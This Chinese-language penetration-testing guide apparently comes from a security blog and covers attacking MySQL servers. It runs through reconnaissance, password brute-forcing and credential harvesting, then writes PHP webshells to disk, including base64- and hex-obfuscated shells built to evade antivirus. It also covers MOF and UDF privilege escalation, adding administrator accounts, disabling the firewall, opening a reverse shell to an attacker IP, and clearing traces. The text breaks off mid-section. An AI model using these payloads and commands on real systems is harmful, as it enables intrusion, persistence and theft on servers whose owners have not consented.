+<p>Mysql数据库是目前世界上使用最为广泛的数据库之一，很多著名公司和站点都使用Mysql作为其数据库支撑，目前很多架构都以Mysql作为数据库管理系统，例如LAMP、和WAMP等，在针对网站渗透中，很多都是跟Mysql数据库有关，各种Mysql注入，Mysql提权，Mysql数据库root账号webshell获取等的，但没有一个对Mysql数据库渗透较为全面对总结，针对这种情况我们开展了研究，虽然我们团队今年正在出版《网络攻防实战研究——漏洞利用与提权》，但技术的进步有无止境，思想有多远，路就可以走多远，在研究mysql数据库安全之余，<strong>对Mysql如何通过msf、sqlmap等来进行扫描、漏洞利用、提权、Mysql密码破解和获取webshell等进行了详细研究。</strong></p>
+<h2>1.1 Mysql信息收集</h2>
+<h4>1.端口信息收集</h4>
+<p>Mysql默认端口是3306端口，但也有自定义端口，针对默认端口扫描主要利用扫描软件进行探测，推荐使用：</p>
+<p>（1）iisputter，直接填写3306端口，IP地址填写单个或者C段地址。</p>
+<p>（2）nmap扫描nmap -p 3306 192.168.1.1-254</p>
+<p>特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对某一个IP地址进行全端口扫描，端口扫描软件还有sfind等DOS下扫描的工具。</p>
+<h4>2.版本信息收集</h4>
+<p>（1）msf查看版本信息<code>auxiliary/scanner/mysql/mysql_version</code>模块，以扫描主机192.168.157.130为例，命令为：</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_version
+set rhosts 192.168.157.130
+run</code></pre>
+<p>(2）mysql查询版本命令：</p>
+
+<pre><code>SELECT @@version`、`SELECT  version();</code></pre>
+<p>(3)sqlmap通过注入点扫描确认信息：</p>
+
+<pre><code>sqlmap.py -u url --dbms mysql</code></pre>
+<p>（4）phpmyadmin管理页面登录后查看<code>localhost-&gt;变量-&gt;服务器变量和设置中的version</code>参数值。</p>
+<h4>3.数据库管理信息收集</h4>
+<p>Mysql管理工具有多种，例如phpmyadmin网站管理，Navicat for MySQL以及MysqlFront等客户端工具。这些工具有的会直接保存配置信息，这些信息包含数据库服务器地址和数据库用户名以及密码，通过嗅探或者破解配置文件可以获取密码等信息。</p>
+<h4>4.msf信息收集模块</h4>
+<p>（1）mysql哈希值枚举</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_hashdump
+set username root
+set password root
+run</code></pre>
+<p>（2）获取相关信息</p>
+
+<pre><code>use auxiliary/admin/mysql/mysql_enum
+set username root
+set password root
+run</code></pre>
+<p>获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值。</p>
+<p>（3）执行mysql语句，连接成功后可以在msf执行sql语句，跟sqlmap的<code>--sql-shell</code>模块类似。</p>
+
+<pre><code>use auxiliary/admin/mysql/mysql_sql</code></pre>
+<p>（4）将mysql_schem导出到本地 /root/.msf4/loot/文件夹下</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_schemadump</code></pre>
+<p>（5）文件枚举和目录可写信息枚举</p>
+
+<pre><code>auxiliary/scanner/mysql/mysql_file_enum
+auxiliary/scanner/mysql/mysql_writable_dirs</code></pre>
+<p>没有测试成功过，需要定义枚举目录和相关文件，觉得基本没有啥用。</p>
+<h2>1.2Mysql密码获取</h2>
+<h4>1.2.1暴力破解</h4>
+<p>Mysql暴力破解主要有几种：</p>
+<p>1.网页在线连接破解</p>
+<p>可以使用burpsuite和phpMyAdmin多线程批量破解工具。 下载：<a href="https://portswigger.net/burp/%E3%80%81" target="_blank">https://portswigger.net/burp/、</a><a href="http://pan.baidu.com/s/1c1LD6co" target="_blank">http://pan.baidu.com/s/1c1LD6co</a></p>
+<p>2.msf通过命令行进行暴力破解</p>
+<p>msf破解mysql密码模块<code>auxiliary/scanner/mysql/mysql_login</code>，其参数主要有<code>BLANK_PASSWORDS</code>、<code>BRUTEFORCE_SPEED</code>、<code>DB_ALL_CREDS</code>、<code>DB_ALL_PASS</code>、<code>DB_ALL_USERS</code>、<code>PASSWORD</code>、<code>PASS_FILE</code>、<code>Proxies</code>、<code>RHOSTS</code>、<code>RPORT</code>、<code>STOP_ON_SUCCESS</code>、<code>THREADS</code>、<code>USERNAME</code>、<code>USERPASS_FILE</code>、<code>USER_AS_PASS</code>、<code>USER_FILE</code>、<code>VERBOSE</code>参数。对单一主机仅仅需要设置<code>RHOSTS</code>、<code>RPORT</code>、<code>USERNAME</code>、<code>PASSWORD</code>和<code>PASS_FILE</code>，其它参数根据实际情况进行设置。</p>
+<p>（1）场景A：对内网获取root某一个口令后，扩展渗透</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.157.1-254
+set password root
+set username root
+run</code></pre>
+<p>执行后对192.168.157.1-254进行mysql密码扫描验证。</p>
+<p>（2）场景B：使用密码字典进行扫描</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.168.157.1-254
+set pass_file /tmp/password.txt
+set username root
+run</code></pre>
+<p>3.使用nmap扫描并破解密码</p>
+<p>（1）对某一个IP或者IP地址段进行nmap默认密码暴力破解并扫描</p>
+
+<pre><code>nmap --script=mysql-brute 192.168.157.130
+nmap --script=mysql-brute 192.168.157.1-254</code></pre>
+<p>（2）使用root账号root密码进行mysql密码验证并扫描获取指定IP地址的端口信息以及mysql数据库相关信息</p>
+
+<pre><code>nmap -sV --script=mysql-databases --script-argsmysqluser=root,mysqlpass=root 192.168.157.130</code></pre>
+<p>（3）检查root空口令</p>
+
+<pre><code>nmap --script mysql-empty-password 192.168.195.130</code></pre>
+<p>4.使用hscan工具对mysql口令进行扫描，需要设置扫描IP地址段以及数据库口令字典及用户名字典。</p>
+<h4>1.2.2源代码泄露</h4>
+<p>1.网站源代码备份文件</p>
+<p>一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为<code>config.php</code>、<code>web.config</code>、<code>conn.asp</code>、<code>db.php/asp</code>、<code>jdbc.properties</code>、<code>sysconfig.properties</code>、<code>JBOSS_HOME\docs\examples\jca\XXXX-ds.xml</code>。以前有一款工具挖掘鸡可以自定义网站等名称对zip/rar/tar/tar.gz/gz/sql等后缀文件进行扫描。</p>
+<p>2.配置备份文件</p>
+<p>使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件。</p>
+<h4>1.2.3文件包含</h4>
+<p>本地文件包含漏洞可以包含文件，通过查看文件代码获取数据库配置文件，进而读取数据库用户名和密码。</p>
+<h4>1.2.4其它情况</h4>
+<p>有些软件会将IP地址、数据库用户名和密码写进程序中，运行程序后，通过cain软件进行嗅探，可以获取数据库密码。另外Mysql客户端管理工具有的管理员会建立连接记录，这些连接记录保存了用户名、密码和连接IP地址或者主机名，通过配置文件或者嗅探可以获取用户名和密码。</p>
+<h2>1.3Mysql获取webshell</h2>
+<h4>1.3.1phpmyadminroot账号获取webshell</h4>
+<p>MysqlRoot账号通过phpMyAdmin获取webshell的思路，主要有下面几种方式，以第一二六八种方法较佳，其它可以根据实际情况来进行。</p>
+<p>1.直接读取后门文件</p>
+<p>通过程序报错、<code>phpinfo</code>函数、程序配置表等直接获取网站真实路径，有些网站前期已经被人渗透过，因此在目录下留有后门文件通过<code>load_file</code>直接读取。</p>
+<p>2.直接导出一句话后门</p>
+<p>前提需要知道网站的真实物理路径，例如呼求偶真实路径<code>D:\work\WWW</code>，则可以通过执行以下查询，来获取一句话后门文件<code>cmd.php</code>，访问地址<a href="http://www.somesite.com/cmd.php" target="_blank">http://www.somesite.com/cmd.php</a></p>
+
+<pre><code>select '&lt;?php @eval($_POST[antian365]);?&gt;'INTO OUTFILE 'D:/work/WWW/antian365.php'</code></pre>
+<p>3.创建数据库导出一句话后门</p>
+<p>在查询窗口直接执行以下代码即可，跟2.原理类似。</p>
+
+<pre><code>CREATE TABLE `mysql`.`antian365` (`temp` TEXT NOTNULL );
+INSERT INTO `mysql`.`antian365` (`temp` ) VALUES('&lt;?php @eval($_POST[antian365]);?&gt;');
+SELECT `temp` FROM `antian365` INTO OUTFILE'D:/www/antian365.php';
+DROP TABLE IF EXISTS `antian365`;</code></pre>
+<p>4.可执行命令方式</p>
+<p>​    创建执行命令形式的shell，但前提是对方未关闭系统函数。该方法导出成功后可以直接执行DOS命令，使用方法:www.xxx.com/antian365.php?cmd=(cmd=后面直接执行dos命令)。</p>
+
+<pre><code>select '&lt;?php echo \'&lt;pre&gt;\';system($_GET[\'cmd\']); echo \'&lt;/pre&gt;\'; ?&gt;' INTO OUTFILE 'd:/www/antian365.php'</code></pre>
+<p>另外在linux下可以导出直接执行命令的shell：</p>
+
+<pre><code>SELECT '&lt;? system($_GET[\'c\']); ?&gt;' INTO OUTFILE '/var/www/shell.php';</code></pre>
+<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" target="_blank">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
+<p>5.过杀毒软件方式</p>
+<p>通过后台或者存在上传图片的地方，上传图片publicguide.jpg，内容如下：</p>
+
+<pre><code>&lt;?php$a=' PD9waHAgQGV2YWwoJF9QT1NUWydhbnRpYW4zNjUnXSk7ZGllKCk7Pz4=';error_reporting(0);@set_time_limit(0);eval("?&gt;".base64_decode($a));?&gt;</code></pre>
+<p>然后通过图片包含temp.php，导出webshell。</p>
+
+<pre><code>select '&lt;?php include 'publicguide.jpg' ?&gt;'INTO OUTFILE 'D:/work/WWW/antian365.php'</code></pre>
+<p>一句话后门密码：antian365</p>
+<p>6.直接导出加密webshell</p>
+<p>一句话后门文件密码：pp64mqa2x1rnw68，执行以下查询直接导出加密webshell，<code>D:/WEB/IPTEST/22.php</code>，注意在实际过程需要修改<code>D:/WEB/IPTEST/22.php</code>。</p>
+
+<pre><code>select unhex('203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E') into dumpfile 'D:/WEB/IPTEST/22.php'</code></pre>
+<p>注意：</p>
+<p>也可以使用<a href="http://tool.lu/hexstr/" target="_blank">http://tool.lu/hexstr/</a>网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入unhex函数进行查询即可：</p>
+
+<pre><code>select unhex('十六进制字符串') into dumpfile 'D:/WEB/shell.php'</code></pre>
+<p>7.CMS系统获取webshell</p>
+<p>有些情况下无法获取网站的真实路径，则意味着无法直接导出一句话webshell，可以通过CMS系统管理账号登录系统后，寻找漏洞来突破，例如dedecms则可以通过破解管理员账号后直接上传文件来获取webshell。Discuz！的UC_key可以直接获取webshell。甚至某些系统可以直接上传php文件。下面是一些CMS系统渗透的技巧：</p>
+<p>（1）dedecms系统的密码有直接md5，也有20位的密码，如果是20位的密码则需要去掉密码中的前3位和最后1位，然后对剩余的值进行md5解密即可；</p>
+<p>（2）phpcms v9版本的密码需要加<code>salt</code>进行破解，需要选择破解算法<code>md5(md5($pass).$salt)</code>进行破解。</p>
+<p>（3）Discuz！论坛帐号保存在ucenter_members（Discuz7.X及以上版本）或者cdb_members（discuz6.x版本）表中，其破解需要带<code>salt</code>进行，其破解时是使用<code>password:salt</code>进行，例如<code>a0513df9929afc972f024fa4e586e829:399793</code>。</p>
+<p>8.general_log_file获取webshell</p>
+<p>（1）查看genera文件配置情况</p>
+
+<pre><code>show global variables like "%genera%";</code></pre>
+<p>（2）关闭general_log</p>
+
+<pre><code>set global general_log=off;</code></pre>
+<p>（3）通过general_log选项来获取webshell</p>
+
+<pre><code>set global general_log='on';
+SET global general_log_file='D:/phpStudy/WWW/cmd.php';</code></pre>
+<p>在查询中执行语句：</p>
+
+<pre><code>SELECT '&lt;?php assert($_POST["cmd"]);?&gt;';</code></pre>
+<p>Shell为cmd.php，一句话后门，密码为cmd。</p>
+<h3>1.3.2sqlmap注入点获取webshell</h3>
+<p>sqlmap注入点获取webshell的前提是具备写权限，一般是root账号，通过执行命令来获取：</p>
+
+<pre><code>sqlmap -u url--os-shell
+
+echo "&lt;?php @eval($_POST['c']);?&gt;" &gt;/data/www/1.php</code></pre>
+<h2>1.4Mysql提权</h2>
+<h3>1.4.1mof提权</h3>
+<h4>1.Webshell上传mof文件提权</h4>
+<p>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit(<a href="https://www.exploit-db.com/exploits/23083/)%EF%BC%8C%E7%AE%80%E7%A7%B0mysql%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%830day(MySQL" target="_blank">https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day(MySQL</a> Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：</p>
+
+<pre><code>方法1：运行 MOF 文件指定为命令行参数 Mofcomp.exe 文件。
+方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。
+方法3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</code></pre>
+<p>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用<code>IMofCompiler::CompileFile</code>方法。第三种方法仅为向后兼容性与早期版本的 <code>WMI</code>提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到<code>%SystemRoot%\System32\Wbem\MOF</code>目录下，否则会失败！</p>
+<p>该漏洞的利用前提条件是必须具备mysql的root权限，在Kingcope公布的0day中公布了一个pl利用脚本。</p>
+
+<pre><code>perl mysql_win_remote.pl 192.168.2.100 root "" 192.168.2.150 5555</code></pre>
+<p>192.168.2.100为mysql数据库所在服务器，mysql口令为空，反弹到192.168.2.150的5555端口上。</p>
+<h4>2.生成nullevt.mof文件</h4>
+<p>将以下代码保存为nullevt.mof文件：</p>
+
+<pre><code>#pragma namespace("\\\\.\\root\\subscription") 
+
+instance of __EventFilter as $EventFilter
+
+{ 
+
+EventNamespace = "Root\\Cimv2"; 
+
+Name  = "filtP2"; 
+
+    Query = "Select \ From __InstanceModificationEvent " 
+
+            "Where TargetInstance Isa \"Win32_LocalTime\" " 
+
+            "And TargetInstance.Second = 5"; 
+
+QueryLanguage = "WQL"; 
+
+}; 
+
+
+
+instance of ActiveScriptEventConsumer as $Consumer 
+
+{ 
+
+    Name = "consPCSV2"; 
+
+ScriptingEngine = "JScript"; 
+
+ScriptText = 
+
+    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add")"; 
+
+}; 
+
+instance of __FilterToConsumerBinding
+
+{ 
+
+    Consumer   = $Consumer; 
+
+    Filter = $EventFilter; 
+
+};</code></pre>
+<h4>3.通过Mysql查询将文件导入</h4>
+<p>执行以下查询语句，将上面生成的nullevt.mof导入到<code>c:\windows\system32\wbem\mof\</code>目录下在windows7中默认是拒绝访问的。导入后系统会自动运行，执行命令。</p>
+
+<pre><code>selectload_file('C:\\RECYCLER\\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';</code></pre>
+<h3>1.4.2.Msf直接mof提权</h3>
+<p>Msf下的<code>exploit/windows/mysql/mysql_mof</code>模块提供了直接<code>Mof</code>提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p>
+
+<pre><code>use exploit/windows/mysql/mysql_mof
+set rhost 192.168.157.1 //设置需要提权的远程主机IP地址
+set rport 3306 //设置mysql的远程端口
+set password root //设置mysql数据库root密码
+set username root //设置mysql用户名
+options //查看设置
+run 0</code></pre>
+<p>技巧：</p>
+<p>要是能够通过网页连接管理（phpmyadmin），则可以修改<code>host</code>为<code>%</code>并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。</p>
+<p>方法1：本地登入mysql，更改 <code>mysql</code>数据库里的 <code>user</code> 表里的 <code>host</code>项，将<code>localhost</code>改为<code>%</code></p>
+
+<pre><code>use mysql;
+update user set host = '%' where user = 'root';
+FLUSH PRIVILEGES ;
+select host, user from user;</code></pre>
+<p>方法2：直接授权(推荐)</p>
+<p>从任何主机上使用root用户，密码：youpassword（你的root密码）连接到mysql服务器：</p>
+
+<pre><code># mysql -u root -proot
+GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;
+FLUSH PRIVILEGES;</code></pre>
+<p>推荐重新增加一个用户，在实际测试过程中发现很多服务器使用root配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改root配置。</p>
+<h3>1.4.3UDF提权</h3>
+<p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限，其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码</p>
+<p>Windows下UDF提权对于Windows2008以下服务器比较适用，也即针对Windows2000、Windows2003的成功率较高。</p>
+<p>1.UDF提权条件</p>
+<p>（1）Mysql版本大于<code>5.1</code>版本<code>udf.dll</code>文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</p>
+<p>（2）Mysql版本小于<code>5.1</code>版本。<code>udf.dll</code>文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于<code>c:\winnt\system32</code>。</p>
+<p>（3）掌握的<code>mysql</code>数据库的账号有对<code>mysql</code>的<code>insert</code>和<code>delete</code>权限以创建和抛弃函数，一般以<code>root</code>账号为佳，具备`root账号所具备的权限的其它账号也可以。</p>
+<p>（4）可以将<code>udf.dll</code>写入到相应目录的权限。</p>
+<p>2.提权方法</p>
+<p>（1）获取数据库版本、数据位置以及插件位置等信息</p>
+
+<pre><code>select version();//获取数据库版本
+select user();//获取数据库用户
+select @@basedir ;//获取安装目录
+show variables like '%plugins%';  //寻找mysql安装路径</code></pre>
+<p>（2）导出路径</p>
+
+<pre><code>C:\Winnt\udf.dll    Windows 2000
+C:\Windows\udf.dll   Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）</code></pre>
+<p>MYSQL 5.1以上版本，必须要把<code>udf.dll</code>文件放到MYSQL安装目录下的<code>libplugin</code>文件夹下才能创建自定义函数。该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建<code>libplugin</code>文件夹，然后将<code>udf.dll</code>文件导出到该目录即可。</p>
+<p>在某些情况下，我们会遇到<code>Can't open shared library</code>的情况，这时就需要我们把<code>udf.dll</code>导出到<code>lib\plugin</code>目录下才可以，网上大牛发现利用<code>NTFS ADS</code>流来创建文件夹的方法：</p>
+
+<pre><code>select @@basedir;  //查找到mysql的目录
+select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';   //利用NTFS ADS创建lib目录
+select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录</code></pre>
+<p>执行成功以后就会<code>plugin</code>目录，然后再进行导出<code>udf.dll</code>即可。</p>
+<p>（3）创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：</p>
+
+<pre><code>create function cmdshell returns string soname ‘lib_mysqludf_sys.dll’;</code></pre>
+<p>（4）执行命令：</p>
+
+<pre><code>select sys_eval(‘whoami’);</code></pre>
+<p>一般情况下不会出现创建不成功哦。</p>
+<p>连不上3389可以先停止windows防火墙和筛选</p>
+
+<pre><code>select sys_eval(‘net stop policyagent’);
+select sys_eval(‘net stop sharedaccess’);</code></pre>
+<p>udf.dll下常见函数：</p>
+
+<pre><code>cmdshell  执行cmd;
+downloader  下载者,到网上下载指定文件并保存到指定目录;
+open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell   反弹Shell;
+ProcessView 枚举系统进程;
+KillProcess 终止指定进程;
+regread     读注册表;
+regwrite    写注册表;
+shut        关机,注销,重启;
+about       说明与帮助函数;</code></pre>
+<p>具体用户示例：</p>
+
+<pre><code>select cmdshell('net user iis_user 123!@#abcABC /add');
+select cmdshell('net localgroup administrators iis_user /add');
+select cmdshell('regedit /s d:web3389.reg');
+select cmdshell('netstat -an');</code></pre>
+<p>（5）清除痕迹</p>
+
+<pre><code>drop function cmdshell;//将函数删除</code></pre>
+<p>删除udf.dll文件以及其它相关入侵文件及日志。</p>
+<p>（6）常见错误</p>
+<blockquote><p>1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</p>
+</blockquote>
+<p>在<code>my.ini</code>或者<code>mysql.cnf</code>文件中注销 (使用<code>#</code>号) 包含<code>secure_file_priv</code>的行(<code>SHOW VARIABLES LIKE "secure_file_priv"</code>)。</p>
+<blockquote><p>1123 - Can't initialize function 'backshell'; UDFs are unavailable with the --skip-grant-tables option</p>
+</blockquote>
+<p>需要将my.ini中的<code>skip-grant-tables</code>选项去掉。</p>
+<p>3.webshell下udf提权</p>
+<p>通过集成udf提权的webshell输入数据库用户名及密码以及数据库服务器地址或者IP通过连接后导出进行提权。</p>
+<p>4.Mysql提权综合利用工具</p>
+<p>v5est0r 写了一个Mysql提权综合利用工具，详细情况请参考其代码共享网站：<a href="https://github.com/v5est0r/Python_FuckMySQL%E5%85%B6%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD%E6%9C%89%EF%BC%9A" target="_blank">https://github.com/v5est0r/Python_FuckMySQL其主要功能有：</a></p>
+
+<pre><code>（1）自动导出你的backdoor和mof文件
+（2）自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权
+（3）导出LPK.dll文件，劫持系统目录提权
+（4）写启动项提权</code></pre>
+<p>UdF自动提权：</p>
+
+<pre><code>python root.py -a 127.0.0.1 -p root -e "ver&amp;whoami" -m udf</code></pre>
+<p>LPK劫持提权：</p>
+
+<pre><code>python root.py -a 127.0.0.1 -p root -e "ver&amp;whoami" -m lpk</code></pre>
+<p>启动项提权：</p>
+
+<pre><code>python root.py -a 127.0.0.1 -p root -e "ver&amp;whoami" –mst</code></pre>
+<p>例如通过<code>LOAD_FILE</code>来查看<code>Mysql</code>配置文件<code>my.ini</code>，如果其中配置了<code>skip-grant-tables</code>，这无法进行提权</p>
+<p>1.6.3无法获取webshell提权</p>
+<p>1.连接mysql</p>
+
+<pre><code>（1）mysql.exe -h ip -uroot -p
+（2）phpmyadmin
+（3）Navicat for MySQL</code></pre>
+<p>2.查看数据库版本和数据路径</p>
+
+<pre><code>SELECT VERSION( );
+Select @@datadir;
+5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/
+5.1以上版本 通过以下查询来获取插件路径：
+SHOW VARIABLES WHERE Variable_Name LIKE "%dir";
+show variables like '%plugin%' ;
+select load_file('C:/phpStudy/Apache/conf/httpd.conf')
+select load_file('C:/phpStudy/Apache/conf/vhosts.conf')
+select load_file('C:/phpStudy/Apache/conf/extra/vhosts.conf')
+select load_file('C:/phpStudy/Apache/conf/extra/httpd.conf')
+select load_file('d:/phpStudy/Apache/conf/vhosts.conf')</code></pre>
+<p>3.修改mysql.txt</p>
+<p>Mysql.txt为udf.dll的二进制文件转成十六进制代码。</p>
+<p>（1）先执行导入ghost表中的内容</p>
+<p>修改以下代码的末尾代码  select backshell("YourIP",4444);</p>
+<p>（2）导出文件到某个目录</p>
+
+<pre><code>select data from Ghost into dumpfile 'c:/windows/mysqldll.dll'; 
+select data from Ghost into dumpfile 'c:/windows/system32/mysqldll'; 
+select data from Ghost into dumpfile 'c:/phpStudy/MySQL/lib/plugin/mysqldll'; 
+select data from Ghost into dumpfile 'E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysqldll'; 
+select data from Ghost into dumpfile 'C:/websoft/MySQL/MySQL Server 5.5/lib/plugin/mysqldll.dll' 
+select data from Ghost into dumpfile 'D:/phpStudy/MySQL/lib/plugin/mysqldll.dll'; 
+select load_file('C:/ProgramData/MySQL/MySQL Server 5.1/Data/mysql/user.frm');
+select data from Ghost into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\lib/plugin/mysqldll.dll'</code></pre>
+<p>（3）查看FUNCTION中是否存在cmdshell和backshell</p>
+<p>存在则删除：</p>
+
+<pre><code>drop FUNCTION cmdshell;//删除cmdshell
+drop FUNCTION backshell;//删除backshell</code></pre>
+<p>创建backshell：</p>
+
+<pre><code>CREATE FUNCTION backshell RETURNS STRING SONAME 'mysqldll.dll'; //创建backshell</code></pre>
+<p>在具备独立主机的服务器上执行监听:</p>
+
+<pre><code>nc -vv -l -p 44444</code></pre>
+<p>执行查询：</p>
+
+<pre><code>select backshell("192.192.192.1",44444);//修改192.192.192.1为你的IP和端口</code></pre>
+<p>4.获取webshell后添加用户命令</p>
+<p>注意如果不能直接执行，则需要到<code>c:\windows\system32\</code>下执行</p>
+
+<pre><code>net user antian365 www.xianzhi.aliyun.com /add 
+
+net localgroup administrators antian365</code></pre>
+<h3>1.6.4sqlmap直连数据库提权</h3>
+<p>Sqlmap直接连接数据库提权，需要有写入权限和root账号及密码，命令如下：</p>
+<p>（1）连接数据库</p>
+
+<pre><code>sqlmap.py -d "mysql://root:123456@219.115.1.1:3306/mysql" --os-shell</code></pre>
+<p>（2）选择操作系统的架构，32位操作系统选择1，64位选择2.</p>
+<p>（3）自动上传udf或提示os-shell</p>
+<p>（4）执行whomai命令如果获取系统权限，则表示提权成功。</p>
+<p>4.msfudf提权</p>
+<p>Kali渗透测试平台下执行（kali下载地<a href="https://www.kali.org/downloads/%EF%BC%89%EF%BC%9A" target="_blank">https://www.kali.org/downloads/）：</a></p>
+
+<pre><code>msfconsole
+use exploit/windows/mysql/mysql_payload
+options
+set rhost 192.168.2.1
+set rport 3306
+set username root
+set password 123456
+run 0或者exploit</code></pre>
+<p>msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是<code>secure-file-priv</code>选项，如果有该选项基本不会成功。</p>
+<h3>1.6.4启动项提权</h3>
+<p>1.创建表并插入vbs脚本到表中</p>
+<p>依次使用以下命令：</p>
+
+<pre><code>show databases ;
+use test;
+show tables;
+create table a (cmd text); 
